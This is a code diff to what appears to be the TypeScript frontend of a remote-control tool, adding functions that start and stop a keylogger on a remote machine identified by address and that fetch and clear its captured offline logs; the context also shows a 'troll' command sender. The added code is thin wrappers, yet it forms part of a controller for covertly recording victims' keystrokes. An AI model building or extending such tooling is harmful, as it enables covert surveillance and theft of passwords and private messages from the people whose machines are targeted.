@@ -328,3 +328,28 @@ export const sendTrollCommand = async (
     command: cleanCommand,
   });
 };
+
+export const startKeyloggerCmd = async (
+  addr: string | undefined,
+  realtime: boolean
+): Promise<void> => {
+  return invoke("start_keylogger", { addr, realtime });
+};
+
+export const stopKeyloggerCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_keylogger", { addr });
+};
+
+export const getOfflineLogsCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("get_offline_logs", { addr });
+};
+
+export const clearOfflineLogsCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("clear_offline_logs", { addr });
+};
